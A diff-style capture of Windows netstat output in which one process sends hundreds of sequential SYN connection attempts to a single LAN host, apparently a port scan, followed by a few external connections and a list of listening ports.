+  TCP    192.168.110.29:63158   192.168.110.143:5488   SYN_SENT        16728
+  TCP    192.168.110.29:63159   192.168.110.143:5487   SYN_SENT        16728
+  TCP    192.168.110.29:63160   192.168.110.143:5486   SYN_SENT        16728
+  TCP    192.168.110.29:63161   192.168.110.143:5485   SYN_SENT        16728
+  TCP    192.168.110.29:63162   192.168.110.143:5484   SYN_SENT        16728
+  TCP    192.168.110.29:63163   192.168.110.143:5483   SYN_SENT        16728
+  TCP    192.168.110.29:63164   192.168.110.143:5482   SYN_SENT        16728
+  TCP    192.168.110.29:63165   192.168.110.143:5481   SYN_SENT        16728
+  TCP    192.168.110.29:63166   192.168.110.143:5480   SYN_SENT        16728
+  TCP    192.168.110.29:63167   192.168.110.143:5479   SYN_SENT        16728
+  TCP    192.168.110.29:63168   192.168.110.143:5478   SYN_SENT        16728
+  TCP    192.168.110.29:63169   192.168.110.143:5477   SYN_SENT        16728
+  TCP    192.168.110.29:63170   192.168.110.143:5476   SYN_SENT        16728
+  TCP    192.168.110.29:63171   192.168.110.143:5475   SYN_SENT        16728
+  TCP    192.168.110.29:63172   192.168.110.143:5474   SYN_SENT        16728
+  TCP    192.168.110.29:63173   192.168.110.143:5473   SYN_SENT        16728
+  TCP    192.168.110.29:63174   192.168.110.143:5472   SYN_SENT        16728
+  TCP    192.168.110.29:63175   192.168.110.143:5471   SYN_SENT        16728
+  TCP    192.168.110.29:63176   192.168.110.143:5470   SYN_SENT        16728
+  TCP    192.168.110.29:63177   192.168.110.143:5469   SYN_SENT        16728
+  TCP    192.168.110.29:63178   192.168.110.143:5468   SYN_SENT        16728
+  TCP    192.168.110.29:63179   192.168.110.143:5467   SYN_SENT        16728
+  TCP    192.168.110.29:63180   192.168.110.143:5466   SYN_SENT        16728
+  TCP    192.168.110.29:63181   192.168.110.143:5465   SYN_SENT        16728
+  TCP    192.168.110.29:63182   192.168.110.143:5464   SYN_SENT        16728
+  TCP    192.168.110.29:63183   192.168.110.143:5463   SYN_SENT        16728
+  TCP    192.168.110.29:63184   192.168.110.143:5462   SYN_SENT        16728
+  TCP    192.168.110.29:63185   192.168.110.143:5461   SYN_SENT        16728
+  TCP    192.168.110.29:63186   192.168.110.143:5460   SYN_SENT        16728
+  TCP    192.168.110.29:63187   192.168.110.143:5459   SYN_SENT        16728
+  TCP    192.168.110.29:63188   192.168.110.143:5458   SYN_SENT        16728
+  TCP    192.168.110.29:63189   192.168.110.143:5457   SYN_SENT        16728
+  TCP    192.168.110.29:63190   192.168.110.143:5456   SYN_SENT        16728
+  TCP    192.168.110.29:63191   192.168.110.143:5455   SYN_SENT        16728
+  TCP    192.168.110.29:63192   192.168.110.143:5454   SYN_SENT        16728
+  TCP    192.168.110.29:63193   192.168.110.143:5453   SYN_SENT        16728
+  TCP    192.168.110.29:63194   192.168.110.143:5452   SYN_SENT        16728
+  TCP    192.168.110.29:63195   192.168.110.143:5451   SYN_SENT        16728
+  TCP    192.168.110.29:63196   192.168.110.143:5450   SYN_SENT        16728
+  TCP    192.168.110.29:63197   192.168.110.143:5449   SYN_SENT        16728
+  TCP    192.168.110.29:63198   192.168.110.143:5448   SYN_SENT        16728
+  TCP    192.168.110.29:63199   192.168.110.143:5447   SYN_SENT        16728
+  TCP    192.168.110.29:63200   192.168.110.143:5446   SYN_SENT        16728
+  TCP    192.168.110.29:63201   192.168.110.143:5445   SYN_SENT        16728
+  TCP    192.168.110.29:63202   192.168.110.143:5444   SYN_SENT        16728
+  TCP    192.168.110.29:63203   192.168.110.143:5443   SYN_SENT        16728
+  TCP    192.168.110.29:63204   192.168.110.143:5442   SYN_SENT        16728
+  TCP    192.168.110.29:63205   192.168.110.143:5441   SYN_SENT        16728
+  TCP    192.168.110.29:63206   192.168.110.143:5440   SYN_SENT        16728
+  TCP    192.168.110.29:63207   192.168.110.143:5439   SYN_SENT        16728
+  TCP    192.168.110.29:63208   192.168.110.143:5438   SYN_SENT        16728
+  TCP    192.168.110.29:63209   192.168.110.143:5437   SYN_SENT        16728
+  TCP    192.168.110.29:63210   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:63211   192.168.110.143:5436   SYN_SENT        16728
+  TCP    192.168.110.29:63212   192.168.110.143:5435   SYN_SENT        16728
+  TCP    192.168.110.29:63213   192.168.110.143:5434   SYN_SENT        16728
+  TCP    192.168.110.29:63214   192.168.110.143:5433   SYN_SENT        16728
+  TCP    192.168.110.29:63215   192.168.110.143:5432   SYN_SENT        16728
+  TCP    192.168.110.29:63216   192.168.110.143:5431   SYN_SENT        16728
+  TCP    192.168.110.29:63217   192.168.110.143:5430   SYN_SENT        16728
+  TCP    192.168.110.29:63218   192.168.110.143:5429   SYN_SENT        16728
+  TCP    192.168.110.29:63219   192.168.110.143:5428   SYN_SENT        16728
+  TCP    192.168.110.29:63220   192.168.110.143:5427   SYN_SENT        16728
+  TCP    192.168.110.29:63221   192.168.110.143:5426   SYN_SENT        16728
+  TCP    192.168.110.29:63222   192.168.110.143:5425   SYN_SENT        16728
+  TCP    192.168.110.29:63223   192.168.110.143:5424   SYN_SENT        16728
+  TCP    192.168.110.29:63224   192.168.110.143:5423   SYN_SENT        16728
+  TCP    192.168.110.29:63225   192.168.110.143:5422   SYN_SENT        16728
+  TCP    192.168.110.29:63226   192.168.110.143:5421   SYN_SENT        16728
+  TCP    192.168.110.29:63227   192.168.110.143:5420   SYN_SENT        16728
+  TCP    192.168.110.29:63228   192.168.110.143:5419   SYN_SENT        16728
+  TCP    192.168.110.29:63260   23.59.252.193:443      CLOSE_WAIT      18012
+  TCP    192.168.110.29:63262   23.59.252.193:443      CLOSE_WAIT      18012
+  TCP    192.168.110.29:63418   192.168.110.143:5418   SYN_SENT        16728
+  TCP    192.168.110.29:63419   192.168.110.143:5417   SYN_SENT        16728
+  TCP    192.168.110.29:63420   192.168.110.143:5416   SYN_SENT        16728
+  TCP    192.168.110.29:63421   192.168.110.143:5415   SYN_SENT        16728
+  TCP    192.168.110.29:63422   192.168.110.143:5414   SYN_SENT        16728
+  TCP    192.168.110.29:63423   192.168.110.143:5413   SYN_SENT        16728
+  TCP    192.168.110.29:63424   192.168.110.143:5412   SYN_SENT        16728
+  TCP    192.168.110.29:63425   192.168.110.143:5411   SYN_SENT        16728
+  TCP    192.168.110.29:63426   192.168.110.143:5410   SYN_SENT        16728
+  TCP    192.168.110.29:63427   192.168.110.143:5409   SYN_SENT        16728
+  TCP    192.168.110.29:63428   192.168.110.143:5408   SYN_SENT        16728
+  TCP    192.168.110.29:63430   192.168.110.143:5407   SYN_SENT        16728
+  TCP    192.168.110.29:63431   192.168.110.143:5406   SYN_SENT        16728
+  TCP    192.168.110.29:63432   192.168.110.143:5405   SYN_SENT        16728
+  TCP    192.168.110.29:63433   192.168.110.143:5404   SYN_SENT        16728
+  TCP    192.168.110.29:63434   192.168.110.143:5403   SYN_SENT        16728
+  TCP    192.168.110.29:63435   192.168.110.143:5402   SYN_SENT        16728
+  TCP    192.168.110.29:63436   192.168.110.143:5401   SYN_SENT        16728
+  TCP    192.168.110.29:63437   192.168.110.143:5400   SYN_SENT        16728
+  TCP    192.168.110.29:63438   192.168.110.143:5399   SYN_SENT        16728
+  TCP    192.168.110.29:63439   192.168.110.143:5398   SYN_SENT        16728
+  TCP    192.168.110.29:63440   192.168.110.143:5397   SYN_SENT        16728
+  TCP    192.168.110.29:63441   192.168.110.143:5396   SYN_SENT        16728
+  TCP    192.168.110.29:63442   192.168.110.143:5395   SYN_SENT        16728
+  TCP    192.168.110.29:63443   192.168.110.143:5394   SYN_SENT        16728
+  TCP    192.168.110.29:63444   192.168.110.143:5393   SYN_SENT        16728
+  TCP    192.168.110.29:63445   192.168.110.143:5392   SYN_SENT        16728
+  TCP    192.168.110.29:63446   192.168.110.143:5391   SYN_SENT        16728
+  TCP    192.168.110.29:63447   192.168.110.143:5390   SYN_SENT        16728
+  TCP    192.168.110.29:63448   192.168.110.143:5389   SYN_SENT        16728
+  TCP    192.168.110.29:63449   192.168.110.143:5388   SYN_SENT        16728
+  TCP    192.168.110.29:63450   192.168.110.143:5387   SYN_SENT        16728
+  TCP    192.168.110.29:63451   192.168.110.143:5386   SYN_SENT        16728
+  TCP    192.168.110.29:63452   192.168.110.143:5385   SYN_SENT        16728
+  TCP    192.168.110.29:63453   192.168.110.143:5384   SYN_SENT        16728
+  TCP    192.168.110.29:63454   192.168.110.143:5383   SYN_SENT        16728
+  TCP    192.168.110.29:63455   192.168.110.143:5382   SYN_SENT        16728
+  TCP    192.168.110.29:63456   192.168.110.143:5381   SYN_SENT        16728
+  TCP    192.168.110.29:63457   192.168.110.143:5380   SYN_SENT        16728
+  TCP    192.168.110.29:63458   192.168.110.143:5379   SYN_SENT        16728
+  TCP    192.168.110.29:63459   192.168.110.143:5378   SYN_SENT        16728
+  TCP    192.168.110.29:63460   192.168.110.143:5377   SYN_SENT        16728
+  TCP    192.168.110.29:63461   192.168.110.143:5376   SYN_SENT        16728
+  TCP    192.168.110.29:63462   192.168.110.143:5375   SYN_SENT        16728
+  TCP    192.168.110.29:63463   192.168.110.143:5374   SYN_SENT        16728
+  TCP    192.168.110.29:63464   192.168.110.143:5373   SYN_SENT        16728
+  TCP    192.168.110.29:63465   192.168.110.143:5372   SYN_SENT        16728
+  TCP    192.168.110.29:63466   192.168.110.143:5371   SYN_SENT        16728
+  TCP    192.168.110.29:63467   192.168.110.143:5370   SYN_SENT        16728
+  TCP    192.168.110.29:63468   192.168.110.143:5369   SYN_SENT        16728
+  TCP    192.168.110.29:63469   192.168.110.143:5368   SYN_SENT        16728
+  TCP    192.168.110.29:63470   192.168.110.143:5367   SYN_SENT        16728
+  TCP    192.168.110.29:63471   192.168.110.143:5366   SYN_SENT        16728
+  TCP    192.168.110.29:63472   192.168.110.143:5365   SYN_SENT        16728
+  TCP    192.168.110.29:63473   192.168.110.143:5364   SYN_SENT        16728
+  TCP    192.168.110.29:63474   192.168.110.143:5363   SYN_SENT        16728
+  TCP    192.168.110.29:63475   192.168.110.143:5362   SYN_SENT        16728
+  TCP    192.168.110.29:63476   192.168.110.143:5361   SYN_SENT        16728
+  TCP    192.168.110.29:63477   192.168.110.143:5360   SYN_SENT        16728
+  TCP    192.168.110.29:63478   192.168.110.143:5359   SYN_SENT        16728
+  TCP    192.168.110.29:63479   192.168.110.143:5358   SYN_SENT        16728
+  TCP    192.168.110.29:63480   192.168.110.143:5357   ESTABLISHED     16728
+  TCP    192.168.110.29:63481   192.168.110.143:5356   SYN_SENT        16728
+  TCP    192.168.110.29:63482   192.168.110.143:5355   SYN_SENT        16728
+  TCP    192.168.110.29:63483   192.168.110.143:5354   SYN_SENT        16728
+  TCP    192.168.110.29:63484   192.168.110.143:5353   SYN_SENT        16728
+  TCP    192.168.110.29:63485   192.168.110.143:5352   SYN_SENT        16728
+  TCP    192.168.110.29:63486   192.168.110.143:5351   SYN_SENT        16728
+  TCP    192.168.110.29:63487   192.168.110.143:5350   SYN_SENT        16728
+  TCP    192.168.110.29:63488   192.168.110.143:5349   SYN_SENT        16728
+  TCP    192.168.110.29:63489   192.168.110.143:5348   SYN_SENT        16728
+  TCP    192.168.110.29:63490   192.168.110.143:5347   SYN_SENT        16728
+  TCP    192.168.110.29:63491   192.168.110.143:5346   SYN_SENT        16728
+  TCP    192.168.110.29:63492   192.168.110.143:5345   SYN_SENT        16728
+  TCP    192.168.110.29:63493   192.168.110.143:5344   SYN_SENT        16728
+  TCP    192.168.110.29:63494   192.168.110.143:5343   SYN_SENT        16728
+  TCP    192.168.110.29:63495   192.168.110.143:5342   SYN_SENT        16728
+  TCP    192.168.110.29:63496   192.168.110.143:5341   SYN_SENT        16728
+  TCP    192.168.110.29:63497   192.168.110.143:5340   SYN_SENT        16728
+  TCP    192.168.110.29:63498   192.168.110.143:5339   SYN_SENT        16728
+  TCP    192.168.110.29:63499   192.168.110.143:5338   SYN_SENT        16728
+  TCP    192.168.110.29:63500   192.168.110.143:5337   SYN_SENT        16728
+  TCP    192.168.110.29:63501   192.168.110.143:5336   SYN_SENT        16728
+  TCP    192.168.110.29:63502   192.168.110.143:5335   SYN_SENT        16728
+  TCP    192.168.110.29:63503   192.168.110.143:5334   SYN_SENT        16728
+  TCP    192.168.110.29:63504   192.168.110.143:5333   SYN_SENT        16728
+  TCP    192.168.110.29:63505   192.168.110.143:5332   SYN_SENT        16728
+  TCP    192.168.110.29:63506   192.168.110.143:5331   SYN_SENT        16728
+  TCP    192.168.110.29:63507   192.168.110.143:5330   SYN_SENT        16728
+  TCP    192.168.110.29:63508   192.168.110.143:5329   SYN_SENT        16728
+  TCP    192.168.110.29:63509   192.168.110.143:5328   SYN_SENT        16728
+  TCP    192.168.110.29:63510   192.168.110.143:5327   SYN_SENT        16728
+  TCP    192.168.110.29:63511   192.168.110.143:5326   SYN_SENT        16728
+  TCP    192.168.110.29:63512   192.168.110.143:5325   SYN_SENT        16728
+  TCP    192.168.110.29:63513   192.168.110.143:5324   SYN_SENT        16728
+  TCP    192.168.110.29:63514   192.168.110.143:5323   SYN_SENT        16728
+  TCP    192.168.110.29:63515   192.168.110.143:5322   SYN_SENT        16728
+  TCP    192.168.110.29:63516   192.168.110.143:5321   SYN_SENT        16728
+  TCP    192.168.110.29:63517   192.168.110.143:5320   SYN_SENT        16728
+  TCP    192.168.110.29:63518   192.168.110.143:5319   SYN_SENT        16728
+  TCP    192.168.110.29:63519   192.168.110.143:5318   SYN_SENT        16728
+  TCP    192.168.110.29:63520   192.168.110.143:5317   SYN_SENT        16728
+  TCP    192.168.110.29:63521   192.168.110.143:5316   SYN_SENT        16728
+  TCP    192.168.110.29:63522   192.168.110.143:5315   SYN_SENT        16728
+  TCP    192.168.110.29:63523   192.168.110.143:5314   SYN_SENT        16728
+  TCP    192.168.110.29:63524   192.168.110.143:5313   SYN_SENT        16728
+  TCP    192.168.110.29:63525   192.168.110.143:5312   SYN_SENT        16728
+  TCP    192.168.110.29:63526   192.168.110.143:5311   SYN_SENT        16728
+  TCP    192.168.110.29:63527   192.168.110.143:5310   SYN_SENT        16728
+  TCP    192.168.110.29:63528   192.168.110.143:5309   SYN_SENT        16728
+  TCP    192.168.110.29:63529   192.168.110.143:5308   SYN_SENT        16728
+  TCP    192.168.110.29:63530   192.168.110.143:5307   SYN_SENT        16728
+  TCP    192.168.110.29:63531   192.168.110.143:5306   SYN_SENT        16728
+  TCP    192.168.110.29:63532   192.168.110.143:5305   SYN_SENT        16728
+  TCP    192.168.110.29:63533   192.168.110.143:5304   SYN_SENT        16728
+  TCP    192.168.110.29:63534   192.168.110.143:5303   SYN_SENT        16728
+  TCP    192.168.110.29:63535   192.168.110.143:5302   SYN_SENT        16728
+  TCP    192.168.110.29:63536   192.168.110.143:5301   SYN_SENT        16728
+  TCP    192.168.110.29:63537   192.168.110.143:5300   SYN_SENT        16728
+  TCP    192.168.110.29:63538   192.168.110.143:5299   SYN_SENT        16728
+  TCP    192.168.110.29:63539   192.168.110.143:5298   SYN_SENT        16728
+  TCP    192.168.110.29:63540   192.168.110.143:5297   SYN_SENT        16728
+  TCP    192.168.110.29:63541   192.168.110.143:5296   SYN_SENT        16728
+  TCP    192.168.110.29:63542   192.168.110.143:5295   SYN_SENT        16728
+  TCP    192.168.110.29:63543   192.168.110.143:5294   SYN_SENT        16728
+  TCP    192.168.110.29:63544   192.168.110.143:5293   SYN_SENT        16728
+  TCP    192.168.110.29:63545   192.168.110.143:5292   SYN_SENT        16728
+  TCP    192.168.110.29:63546   192.168.110.143:5291   SYN_SENT        16728
+  TCP    192.168.110.29:63547   192.168.110.143:5290   SYN_SENT        16728
+  TCP    192.168.110.29:63548   192.168.110.143:5289   SYN_SENT        16728
+  TCP    192.168.110.29:63549   192.168.110.143:5288   SYN_SENT        16728
+  TCP    192.168.110.29:63550   192.168.110.143:5287   SYN_SENT        16728
+  TCP    192.168.110.29:63551   192.168.110.143:5286   SYN_SENT        16728
+  TCP    192.168.110.29:63552   192.168.110.143:5285   SYN_SENT        16728
+  TCP    192.168.110.29:63553   192.168.110.143:5284   SYN_SENT        16728
+  TCP    192.168.110.29:63554   192.168.110.143:5283   SYN_SENT        16728
+  TCP    192.168.110.29:63555   192.168.110.143:5282   SYN_SENT        16728
+  TCP    192.168.110.29:63556   192.168.110.143:5281   SYN_SENT        16728
+  TCP    192.168.110.29:63557   192.168.110.143:5280   SYN_SENT        16728
+  TCP    192.168.110.29:63558   192.168.110.143:5279   SYN_SENT        16728
+  TCP    192.168.110.29:63559   192.168.110.143:5278   SYN_SENT        16728
+  TCP    192.168.110.29:63560   192.168.110.143:5277   SYN_SENT        16728
+  TCP    192.168.110.29:63561   192.168.110.143:5276   SYN_SENT        16728
+  TCP    192.168.110.29:63562   192.168.110.143:5275   SYN_SENT        16728
+  TCP    192.168.110.29:63563   192.168.110.143:5274   SYN_SENT        16728
+  TCP    192.168.110.29:63564   192.168.110.143:5273   SYN_SENT        16728
+  TCP    192.168.110.29:63565   192.168.110.143:5272   SYN_SENT        16728
+  TCP    192.168.110.29:63566   192.168.110.143:5271   SYN_SENT        16728
+  TCP    192.168.110.29:63567   192.168.110.143:5270   SYN_SENT        16728
+  TCP    192.168.110.29:63568   192.168.110.143:5269   SYN_SENT        16728
+  TCP    192.168.110.29:63569   192.168.110.143:5268   SYN_SENT        16728
+  TCP    192.168.110.29:63570   192.168.110.143:5267   SYN_SENT        16728
+  TCP    192.168.110.29:63571   192.168.110.143:5266   SYN_SENT        16728
+  TCP    192.168.110.29:63572   192.168.110.143:5265   SYN_SENT        16728
+  TCP    192.168.110.29:63573   192.168.110.143:5264   SYN_SENT        16728
+  TCP    192.168.110.29:63574   192.168.110.143:5263   SYN_SENT        16728
+  TCP    192.168.110.29:63575   192.168.110.143:5262   SYN_SENT        16728
+  TCP    192.168.110.29:63576   192.168.110.143:5261   SYN_SENT        16728
+  TCP    192.168.110.29:63577   192.168.110.143:5260   SYN_SENT        16728
+  TCP    192.168.110.29:63578   192.168.110.143:5259   SYN_SENT        16728
+  TCP    192.168.110.29:63579   192.168.110.143:5258   SYN_SENT        16728
+  TCP    192.168.110.29:63580   192.168.110.143:5257   SYN_SENT        16728
+  TCP    192.168.110.29:63581   192.168.110.143:5256   SYN_SENT        16728
+  TCP    192.168.110.29:63582   192.168.110.143:5255   SYN_SENT        16728
+  TCP    192.168.110.29:63583   192.168.110.143:5254   SYN_SENT        16728
+  TCP    192.168.110.29:63584   192.168.110.143:5253   SYN_SENT        16728
+  TCP    192.168.110.29:63585   192.168.110.143:5252   SYN_SENT        16728
+  TCP    192.168.110.29:63586   192.168.110.143:5251   SYN_SENT        16728
+  TCP    192.168.110.29:63587   192.168.110.143:5250   SYN_SENT        16728
+  TCP    192.168.110.29:63588   192.168.110.143:5249   SYN_SENT        16728
+  TCP    192.168.110.29:63589   192.168.110.143:5248   SYN_SENT        16728
+  TCP    192.168.110.29:63590   192.168.110.143:5247   SYN_SENT        16728
+  TCP    192.168.110.29:63591   192.168.110.143:5246   SYN_SENT        16728
+  TCP    192.168.110.29:63592   192.168.110.143:5245   SYN_SENT        16728
+  TCP    192.168.110.29:63593   192.168.110.143:5244   SYN_SENT        16728
+  TCP    192.168.110.29:63594   192.168.110.143:5243   SYN_SENT        16728
+  TCP    192.168.110.29:63595   192.168.110.143:5242   SYN_SENT        16728
+  TCP    192.168.110.29:63596   192.168.110.143:5241   SYN_SENT        16728
+  TCP    192.168.110.29:63597   192.168.110.143:5240   SYN_SENT        16728
+  TCP    192.168.110.29:63598   192.168.110.143:5239   SYN_SENT        16728
+  TCP    192.168.110.29:63599   192.168.110.143:5238   SYN_SENT        16728
+  TCP    192.168.110.29:63600   192.168.110.143:5237   SYN_SENT        16728
+  TCP    192.168.110.29:63601   192.168.110.143:5236   SYN_SENT        16728
+  TCP    192.168.110.29:63602   192.168.110.143:5235   SYN_SENT        16728
+  TCP    192.168.110.29:63603   192.168.110.143:5234   SYN_SENT        16728
+  TCP    192.168.110.29:63604   192.168.110.143:5233   SYN_SENT        16728
+  TCP    192.168.110.29:63605   192.168.110.143:5232   SYN_SENT        16728
+  TCP    192.168.110.29:63606   192.168.110.143:5231   SYN_SENT        16728
+  TCP    192.168.110.29:63607   192.168.110.143:5230   SYN_SENT        16728
+  TCP    192.168.110.29:63608   192.168.110.143:5229   SYN_SENT        16728
+  TCP    192.168.110.29:63609   192.168.110.143:5228   SYN_SENT        16728
+  TCP    192.168.110.29:63610   192.168.110.143:5227   SYN_SENT        16728
+  TCP    192.168.110.29:63611   192.168.110.143:5226   SYN_SENT        16728
+  TCP    192.168.110.29:63612   192.168.110.143:5225   SYN_SENT        16728
+  TCP    192.168.110.29:63613   192.168.110.143:5224   SYN_SENT        16728
+  TCP    192.168.110.29:63614   192.168.110.143:5223   SYN_SENT        16728
+  TCP    192.168.110.29:63615   192.168.110.143:5222   SYN_SENT        16728
+  TCP    192.168.110.29:63616   192.168.110.143:5221   SYN_SENT        16728
+  TCP    192.168.110.29:63617   192.168.110.143:5220   SYN_SENT        16728
+  TCP    192.168.110.29:63618   192.168.110.143:5219   SYN_SENT        16728
+  TCP    192.168.110.29:63619   192.168.110.143:5218   SYN_SENT        16728
+  TCP    192.168.110.29:63620   192.168.110.143:5217   SYN_SENT        16728
+  TCP    192.168.110.29:63621   192.168.110.143:5216   SYN_SENT        16728
+  TCP    192.168.110.29:63622   192.168.110.143:5215   SYN_SENT        16728
+  TCP    192.168.110.29:63623   192.168.110.143:5214   SYN_SENT        16728
+  TCP    192.168.110.29:63624   192.168.110.143:5213   SYN_SENT        16728
+  TCP    192.168.110.29:63625   192.168.110.143:5212   SYN_SENT        16728
+  TCP    192.168.110.29:63626   192.168.110.143:5211   SYN_SENT        16728
+  TCP    192.168.110.29:63627   192.168.110.143:5210   SYN_SENT        16728
+  TCP    192.168.110.29:63628   192.168.110.143:5209   SYN_SENT        16728
+  TCP    192.168.110.29:63629   192.168.110.143:5208   SYN_SENT        16728
+  TCP    192.168.110.29:63630   192.168.110.143:5207   SYN_SENT        16728
+  TCP    192.168.110.29:63631   192.168.110.143:5206   SYN_SENT        16728
+  TCP    192.168.110.29:63632   192.168.110.143:5205   SYN_SENT        16728
+  TCP    192.168.110.29:63633   192.168.110.143:5204   SYN_SENT        16728
+  TCP    192.168.110.29:63634   192.168.110.143:5203   SYN_SENT        16728
+  TCP    192.168.110.29:63635   192.168.110.143:5202   SYN_SENT        16728
+  TCP    192.168.110.29:63636   192.168.110.143:5201   SYN_SENT        16728
+  TCP    192.168.110.29:63637   192.168.110.143:5200   SYN_SENT        16728
+  TCP    192.168.110.29:63638   192.168.110.143:5199   SYN_SENT        16728
+  TCP    192.168.110.29:63639   192.168.110.143:5198   SYN_SENT        16728
+  TCP    192.168.110.29:63640   192.168.110.143:5197   SYN_SENT        16728
+  TCP    192.168.110.29:63641   192.168.110.143:5196   SYN_SENT        16728
+  TCP    192.168.110.29:63642   192.168.110.143:5195   SYN_SENT        16728
+  TCP    192.168.110.29:63643   192.168.110.143:5194   SYN_SENT        16728
+  TCP    192.168.110.29:63644   192.168.110.143:5193   SYN_SENT        16728
+  TCP    192.168.110.29:63645   192.168.110.143:5192   SYN_SENT        16728
+  TCP    192.168.110.29:63646   192.168.110.143:5191   SYN_SENT        16728
+  TCP    192.168.110.29:63647   192.168.110.143:5190   SYN_SENT        16728
+  TCP    192.168.110.29:63648   192.168.110.143:5189   SYN_SENT        16728
+  TCP    192.168.110.29:63649   192.168.110.143:5188   SYN_SENT        16728
+  TCP    192.168.110.29:63650   192.168.110.143:5187   SYN_SENT        16728
+  TCP    192.168.110.29:63651   192.168.110.143:5186   SYN_SENT        16728
+  TCP    192.168.110.29:63652   192.168.110.143:5185   SYN_SENT        16728
+  TCP    192.168.110.29:63653   192.168.110.143:5184   SYN_SENT        16728
+  TCP    192.168.110.29:63654   192.168.110.143:5183   SYN_SENT        16728
+  TCP    192.168.110.29:63655   192.168.110.143:5182   SYN_SENT        16728
+  TCP    192.168.110.29:63656   192.168.110.143:5181   SYN_SENT        16728
+  TCP    192.168.110.29:63657   192.168.110.143:5180   SYN_SENT        16728
+  TCP    192.168.110.29:63658   192.168.110.143:5179   SYN_SENT        16728
+  TCP    192.168.110.29:63659   192.168.110.143:5178   SYN_SENT        16728
+  TCP    192.168.110.29:63660   192.168.110.143:5177   SYN_SENT        16728
+  TCP    192.168.110.29:63661   192.168.110.143:5176   SYN_SENT        16728
+  TCP    192.168.110.29:63662   192.168.110.143:5175   SYN_SENT        16728
+  TCP    192.168.110.29:63663   192.168.110.143:5174   SYN_SENT        16728
+  TCP    192.168.110.29:63664   192.168.110.143:5173   SYN_SENT        16728
+  TCP    192.168.110.29:63665   192.168.110.143:5172   SYN_SENT        16728
+  TCP    192.168.110.29:63666   192.168.110.143:5171   SYN_SENT        16728
+  TCP    192.168.110.29:63667   192.168.110.143:5170   SYN_SENT        16728
+  TCP    192.168.110.29:63668   192.168.110.143:5169   SYN_SENT        16728
+  TCP    192.168.110.29:63669   192.168.110.143:5168   SYN_SENT        16728
+  TCP    192.168.110.29:63670   192.168.110.143:5167   SYN_SENT        16728
+  TCP    192.168.110.29:63671   192.168.110.143:5166   SYN_SENT        16728
+  TCP    192.168.110.29:63672   192.168.110.143:5165   SYN_SENT        16728
+  TCP    192.168.110.29:63673   192.168.110.143:5164   SYN_SENT        16728
+  TCP    192.168.110.29:63674   192.168.110.143:5163   SYN_SENT        16728
+  TCP    192.168.110.29:63675   192.168.110.143:5162   SYN_SENT        16728
+  TCP    192.168.110.29:63676   192.168.110.143:5161   SYN_SENT        16728
+  TCP    192.168.110.29:63677   192.168.110.143:5160   SYN_SENT        16728
+  TCP    192.168.110.29:63678   192.168.110.143:5159   SYN_SENT        16728
+  TCP    192.168.110.29:63679   192.168.110.143:5158   SYN_SENT        16728
+  TCP    192.168.110.29:63680   192.168.110.143:5157   SYN_SENT        16728
+  TCP    192.168.110.29:63681   192.168.110.143:5156   SYN_SENT        16728
+  TCP    192.168.110.29:63682   192.168.110.143:5155   SYN_SENT        16728
+  TCP    192.168.110.29:63683   192.168.110.143:5154   SYN_SENT        16728
+  TCP    192.168.110.29:63684   192.168.110.143:5153   SYN_SENT        16728
+  TCP    192.168.110.29:63685   192.168.110.143:5152   SYN_SENT        16728
+  TCP    192.168.110.29:63686   192.168.110.143:5151   SYN_SENT        16728
+  TCP    192.168.110.29:63687   192.168.110.143:5150   SYN_SENT        16728
+  TCP    192.168.110.29:63688   192.168.110.143:5149   SYN_SENT        16728
+  TCP    192.168.110.29:63689   192.168.110.143:5148   SYN_SENT        16728
+  TCP    192.168.110.29:63690   192.168.110.143:5147   SYN_SENT        16728
+  TCP    192.168.110.29:63691   192.168.110.143:5146   SYN_SENT        16728
+  TCP    192.168.110.29:63692   192.168.110.143:5145   SYN_SENT        16728
+  TCP    192.168.110.29:63693   192.168.110.143:5144   SYN_SENT        16728
+  TCP    192.168.110.29:63694   192.168.110.143:5143   SYN_SENT        16728
+  TCP    192.168.110.29:63695   192.168.110.143:5142   SYN_SENT        16728
+  TCP    192.168.110.29:63696   192.168.110.143:5141   SYN_SENT        16728
+  TCP    192.168.110.29:63697   192.168.110.143:5140   SYN_SENT        16728
+  TCP    192.168.110.29:63698   192.168.110.143:5139   SYN_SENT        16728
+  TCP    192.168.110.29:63699   192.168.110.143:5138   SYN_SENT        16728
+  TCP    192.168.110.29:63700   192.168.110.143:5137   SYN_SENT        16728
+  TCP    192.168.110.29:63701   192.168.110.143:5136   SYN_SENT        16728
+  TCP    192.168.110.29:63702   192.168.110.143:5135   SYN_SENT        16728
+  TCP    192.168.110.29:63703   192.168.110.143:5134   SYN_SENT        16728
+  TCP    192.168.110.29:63706   47.93.172.190:2095     CLOSE_WAIT      17992
+  TCP    192.168.110.29:63723   123.129.228.100:443    CLOSE_WAIT      19624
+  TCP    192.168.110.29:63831   123.129.228.100:80     CLOSE_WAIT      11144
+  TCP    192.168.110.29:63842   112.240.56.214:443     CLOSE_WAIT      11144
+  TCP    192.168.110.29:63860   120.92.77.27:80        CLOSE_WAIT      11144
+  TCP    192.168.110.29:63862   123.129.228.100:443    CLOSE_WAIT      11144
+  TCP    192.168.110.29:64032   59.82.31.169:443       ESTABLISHED     3804
+  TCP    192.168.110.29:64198   110.43.67.241:443      CLOSE_WAIT      19624
+  TCP    192.168.110.29:64205   123.129.228.214:443    CLOSE_WAIT      2844
+  TCP    192.168.110.29:64207   112.132.209.65:443     CLOSE_WAIT      2844
+  TCP    192.168.110.29:64208   112.132.209.65:443     CLOSE_WAIT      2844
+  TCP    192.168.110.29:64211   112.132.209.65:443     CLOSE_WAIT      17080
+  TCP    192.168.110.29:64212   112.132.209.65:443     CLOSE_WAIT      17080
+  TCP    192.168.110.29:64461   119.3.178.178:21114    ESTABLISHED     19624
+  TCP    192.168.110.29:64669   61.241.49.107:443      CLOSE_WAIT      7908
+  TCP    [::]:21                [::]:0                 LISTENING       3648
+  TCP    [::]:22                [::]:0                 LISTENING       3648
+  TCP    [::]:80                [::]:0                 LISTENING       3648
+  TCP    [::]:135               [::]:0                 LISTENING       1072
+  TCP    [::]:443               [::]:0                 LISTENING       3648
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:990               [::]:0                 LISTENING       3648
+  TCP    [::]:5357              [::]:0                 LISTENING       4
+  TCP    [::]:7680              [::]:0                 LISTENING       14636
+  TCP    [::]:49664             [::]:0                 LISTENING       976
+  TCP    [::]:49665             [::]:0                 LISTENING       828
+  TCP    [::]:49666             [::]:0                 LISTENING       1600
+  TCP    [::]:49667             [::]:0                 LISTENING       1428
+  TCP    [::]:49668             [::]:0                 LISTENING       2440
